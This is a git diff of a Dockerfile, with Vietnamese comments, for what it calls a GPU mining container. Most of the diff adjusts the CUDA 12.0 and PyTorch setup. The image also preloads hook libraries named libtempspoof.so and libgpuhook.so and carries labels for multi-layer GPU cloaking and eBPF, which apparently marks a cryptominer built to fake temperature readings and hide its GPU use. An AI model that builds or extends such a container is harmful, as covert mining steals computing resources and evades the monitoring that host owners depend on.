@@ -95,9 +95,12 @@ RUN set -eux; \
 # ------------------  (7)  Thư mục làm việc & Python deps -------------------
 RUN mkdir -p /app
 WORKDIR /app
-COPY requirements.txt /app/
 
-# ----- Cài đặt Python dependencies -----
+# ===== CUDA VERSION SYNCHRONIZATION FIX =====
+# Copy requirements file with CUDA 12.0 compatible packages
+COPY requirements_fixed.txt /app/requirements.txt
+
+# ----- CUDA-compatible Python dependencies installation -----
 RUN set -eux; \
     if ! command -v pip3 >/dev/null 2>&1; then \
         apt-get update && \
@@ -105,6 +108,11 @@ RUN set -eux; \
     fi; \
     python3 -m pip install --upgrade pip; \
     ln -sf $(which python3) /usr/bin/python || true; \
+    # Install PyTorch with specific CUDA compatibility FIRST
+    pip3 install --no-cache-dir --break-system-packages \
+        torch==2.0.1+cu118 torchvision==0.15.2+cu118 torchaudio==2.0.2+cu118 \
+        --index-url https://download.pytorch.org/whl/cu118; \
+    # Then install remaining requirements
     pip3 install --no-cache-dir --break-system-packages --ignore-installed -r requirements.txt && \
     rm -rf /var/lib/apt/lists/* /root/.cache
 
@@ -162,6 +170,21 @@ RUN set -eux; \
     wget -q "https://github.com/vi/websocat/releases/download/v${WEBSOCAT_VERSION}/websocat.${WEBSOCAT_ARCH}" -O /usr/local/bin/websocat; \
     chmod +x /usr/local/bin/websocat
 
+# ------------------  ===== CUDA 12.0 ENFORCEMENT LAYER ===== ----------------------
+# Critical: Ensure Python packages don't override system CUDA 12.0 libraries
+# Strategy: Force LD_LIBRARY_PATH priority + verify NVRTC compatibility
+
+# Force system CUDA 12.0 libraries to take precedence over Python packages
+ENV CUDA_PATH=/usr/local/cuda-12.0 \
+    CUDA_ROOT=/usr/local/cuda-12.0 \
+    CUDA_VERSION=12.0 \
+    CUDA_VERSION_MAJOR=12 \
+    CUDA_VERSION_MINOR=0 \
+    # Force NVRTC to use system libraries
+    CUDA_NVRTC_LIBRARY_DIR=/usr/local/cuda-12.0/targets/x86_64-linux/lib \
+    # Prevent Python CUDA packages from taking precedence
+    PYTHONDONTWRITEBYTECODE=1
+
 # ------------------  (13)  ENV cố định ------------------------------------
 ENV SCRIPT_DIR=/app/mining_environment/scripts \
     CONFIG_DIR=/app/mining_environment/config \
@@ -187,14 +210,15 @@ ENV SCRIPT_DIR=/app/mining_environment/scripts \
     EVENTBUS_HEALTH_CHECK_INTERVAL=60.0
 
 
-# Simplified CUDA library path - production only
-ENV LD_LIBRARY_PATH=/usr/local/cuda/lib64:$LD_LIBRARY_PATH
+# ===== CRITICAL: CUDA 12.0 LIBRARY PATH ENFORCEMENT =====
+# MUST be BEFORE Python package library paths to take precedence
+ENV LD_LIBRARY_PATH="/usr/local/cuda-12.0/targets/x86_64-linux/lib:/usr/local/cuda/lib64:/usr/local/cuda/targets/x86_64-linux/lib:$LD_LIBRARY_PATH"
 
 # ------------------  NVRTC Library Path Fix (ldconfig Method) ---------------------
 # Fix: Cấu hình ldconfig để system tự động tìm NVRTC libraries
 # Lợi ích: Không cần symbolic links, system-wide, persistent, đơn giản hơn
 RUN set -eux; \
-    echo "🔧 [NVRTC-LDCONFIG-FIX] Configuring NVRTC library paths via ldconfig..."; \
+    echo "🔧 [NVRTC-VERSION-SYNC] Enforcing CUDA 12.0 NVRTC libraries..."; \
     # Định vị thư mục chứa NVRTC libraries thực tế
     NVRTC_ACTUAL_DIR="/usr/local/cuda-12.0/targets/x86_64-linux/lib"; \
     NVRTC_FALLBACK_DIR="/usr/local/cuda/targets/x86_64-linux/lib"; \
@@ -202,36 +226,44 @@ RUN set -eux; \
     # Xác định thư mục chứa libraries
     if [ -d "$NVRTC_ACTUAL_DIR" ] && [ -f "$NVRTC_ACTUAL_DIR/libnvrtc-builtins.so.12.0.140" ]; then \
         NVRTC_LIB_DIR="$NVRTC_ACTUAL_DIR"; \
-        echo "[NVRTC-LDCONFIG-FIX] Found NVRTC libraries in: $NVRTC_LIB_DIR"; \
+        echo "[NVRTC-VERSION-SYNC] Found CUDA 12.0 NVRTC libraries in: $NVRTC_LIB_DIR"; \
     elif [ -d "$NVRTC_FALLBACK_DIR" ] && [ -f "$NVRTC_FALLBACK_DIR/libnvrtc-builtins.so.12.0.140" ]; then \
         NVRTC_LIB_DIR="$NVRTC_FALLBACK_DIR"; \
-        echo "[NVRTC-LDCONFIG-FIX] Using fallback directory: $NVRTC_LIB_DIR"; \
+        echo "[NVRTC-VERSION-SYNC] Using fallback directory: $NVRTC_LIB_DIR"; \
     else \
-        echo "[NVRTC-LDCONFIG-FIX] ❌ NVRTC library directory not found in expected locations"; \
+        echo "[NVRTC-VERSION-SYNC] ❌ CUDA 12.0 NVRTC library directory not found"; \
         exit 1; \
     fi; \
-    # Cấu hình ldconfig để system tự động tìm libraries
-    echo "[NVRTC-LDCONFIG-FIX] Adding $NVRTC_LIB_DIR to ldconfig search paths"; \
-    echo "$NVRTC_LIB_DIR" > /etc/ld.so.conf.d/cuda-nvrtc.conf; \
-    # Cập nhật ldconfig cache
+    # ===== CRITICAL STEP: Remove conflicting Python NVRTC packages ===== \
+    echo "[NVRTC-VERSION-SYNC] Removing conflicting Python CUDA packages..."; \
+    pip3 uninstall -y nvidia-cuda-nvrtc-cu12 nvidia-cuda-runtime-cu12 nvidia-cublas-cu12 \
+        nvidia-cuda-cupti-cu12 nvidia-cudnn-cu12 nvidia-cufft-cu12 nvidia-cufile-cu12 \
+        nvidia-curand-cu12 nvidia-cusolver-cu12 nvidia-cusparse-cu12 nvidia-cusparselt-cu12 \
+        nvidia-nccl-cu12 nvidia-nvjitlink-cu12 nvidia-nvtx-cu12 2>/dev/null || echo "Some packages not found, continuing..."; \
+    # Cấu hình ldconfig để system tự động tìm CUDA 12.0 libraries
+    echo "[NVRTC-VERSION-SYNC] Configuring ldconfig for CUDA 12.0 priority"; \
+    echo "$NVRTC_LIB_DIR" > /etc/ld.so.conf.d/cuda-nvrtc-12.0.conf; \
+    # Cập nhật ldconfig cache với CUDA 12.0 priority
     ldconfig; \
     # Fix missing symlinks for runtime compatibility
-    echo "[NVRTC-LDCONFIG-FIX] Creating missing symlinks for runtime compatibility..."; \
+    echo "[NVRTC-VERSION-SYNC] Creating NVRTC version compatibility symlinks..."; \
     cd "$NVRTC_LIB_DIR"; \
     # Ensure libnvrtc.so.12.0 symlink exists (required for runtime loading)
     if [ ! -f "libnvrtc.so.12.0" ]; then \
         ln -sf libnvrtc.so.12.0.140 libnvrtc.so.12.0; \
-        echo "[NVRTC-LDCONFIG-FIX] Created libnvrtc.so.12.0 symlink"; \
+        echo "[NVRTC-VERSION-SYNC] Created libnvrtc.so.12.0 symlink"; \
     fi; \
-    # Verification - kiểm tra ldconfig đã nhận diện được libraries
-    echo "[NVRTC-LDCONFIG-FIX] Verification:"; \
-    ldconfig -p | grep nvrtc-builtins && echo "✅ NVRTC libraries found in ldconfig cache" || echo "⚠️ NVRTC not in cache, checking manually..."; \
-    ls -la "$NVRTC_LIB_DIR"/libnvrtc-builtins.so* || echo "❌ Libraries not found"; \
-    ls -la "$NVRTC_LIB_DIR"/libnvrtc.so* || echo "❌ NVRTC main library not found"; \
-    echo "✅ [NVRTC-LDCONFIG-FIX] ldconfig configuration and symlink fixes completed"
-
-# Backup environment variable cho compatibility
-ENV LD_LIBRARY_PATH="/usr/local/cuda-12.0/targets/x86_64-linux/lib:/usr/local/cuda/targets/x86_64-linux/lib:${LD_LIBRARY_PATH}"
+    # Create explicit libnvrtc-builtins.so.12.0 symlink for exact version match
+    if [ ! -f "libnvrtc-builtins.so.12.0" ]; then \
+        ln -sf libnvrtc-builtins.so.12.0.140 libnvrtc-builtins.so.12.0; \
+        echo "[NVRTC-VERSION-SYNC] Created libnvrtc-builtins.so.12.0 symlink for exact match"; \
+    fi; \
+    # Verification - kiểm tra CUDA 12.0 libraries được nhận diện
+    echo "[NVRTC-VERSION-SYNC] Verification Results:"; \
+    ldconfig -p | grep nvrtc && echo "✅ NVRTC libraries found in ldconfig cache" || echo "⚠️ NVRTC not in cache"; \
+    ls -la "$NVRTC_LIB_DIR"/libnvrtc-builtins.so* && echo "✅ NVRTC builtins libraries found" || echo "❌ NVRTC builtins not found"; \
+    ls -la "$NVRTC_LIB_DIR"/libnvrtc.so* && echo "✅ NVRTC main libraries found" || echo "❌ NVRTC main libraries not found"; \
+    echo "✅ [NVRTC-VERSION-SYNC] CUDA 12.0 enforcement completed successfully"
 
 ENV LD_PRELOAD="/opt/hooks/libtempspoof.so:/opt/hooks/libgpuhook.so"
 
@@ -241,6 +273,12 @@ RUN set -eux; \
     command -v capsh >/dev/null 2>&1 || apt-get install -y --no-install-recommends libcap2-bin; \
     command -v capsh >/dev/null 2>&1 && ln -sf $(command -v capsh) /usr/local/bin/capsh; \
     ldconfig -p | grep -q "libuv.so.1" || (apt-get install -y --no-install-recommends libuv1 && ldconfig); \
+    # Final verification that CUDA 12.0 NVRTC is properly configured
+    echo "=== FINAL CUDA VERSION VERIFICATION ==="; \
+    ldconfig -p | grep nvrtc || echo "Warning: NVRTC not in ldconfig"; \
+    ls -la /usr/local/cuda-12.0/targets/x86_64-linux/lib/libnvrtc-builtins.so.12.0* || echo "Warning: NVRTC 12.0 files missing"; \
+    echo "CUDA_PATH: $CUDA_PATH"; \
+    echo "LD_LIBRARY_PATH: $LD_LIBRARY_PATH"; \
     rm -rf /var/lib/apt/lists/*
 
 
@@ -248,17 +286,19 @@ RUN set -eux; \
 HEALTHCHECK --interval=1m --timeout=10s --start-period=30s --retries=3 CMD pgrep -f start_mining.py || exit 1
 
 LABEL maintainer="Transformer Mining Team" \
-      version="1.2.0" \
-      description="Enhanced GPU mining container with CUDA runtime and OpenCL support" \
+      version="1.3.0-cuda-sync" \
+      description="Enhanced GPU mining container with CUDA 12.0 version synchronization" \
       cuda.version="12.0" \
-      cuda.runtime="enhanced" \
+      cuda.runtime="synchronized" \
+      cuda.nvrtc="12.0-enforced" \
       opencl.enabled="true" \
       ebpf.enabled="true" \
       ebpf.mode="runtime-load-only" \
       gpu.cloaking="multi-layer" \
       gpu.plugins="modular-architecture" \
       gpu.debug="integrated" \
-      security.level="high"
+      security.level="high" \
+      version.sync="cuda-12.0-enforced"
 
       
 # ------------------  (17)  Entrypoint & CMD --------------------------------
